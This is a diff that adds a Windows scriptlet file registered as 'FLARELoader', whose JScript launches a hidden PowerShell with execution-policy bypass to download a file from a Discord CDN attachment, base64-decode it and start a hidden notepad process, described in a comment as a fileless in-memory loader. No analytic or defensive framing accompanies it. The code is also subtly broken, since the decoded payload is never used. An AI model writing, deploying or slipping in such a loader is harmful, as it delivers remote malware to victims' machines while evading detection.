@@ -1,0 +1,20 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="FLARELoader" 
+    classid="{72566E27-1ABB-4EB3-B4F0-EB431CB1CB32}" />
+<script language="JScript">
+<![CDATA[
+    // Fileless loader via PowerShell - pulls from Discord CDN + runs in memory
+    var r = new ActiveXObject("WScript.Shell").Run(
+        "powershell -w h -ep bypass -c " +
+        "\"$c=(Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1498075833670303778/1499228039190413423/WindowsProject1.exe' -UseBasicParsing).Content;" +
+        "$d=[System.Convert]::FromBase64String($c);" +
+        "if([System.Environment]::Is64BitProcess){$p='C:\\Windows\\System32\\notepad.exe'}else{$p='C:\\Windows\\SysWOW64\\notepad.exe'};" +
+        "Start-Process $p -WindowStyle Hidden" +
+        "\"",
+        0, false
+    );
+]]>
+</script>
+</scriptlet>
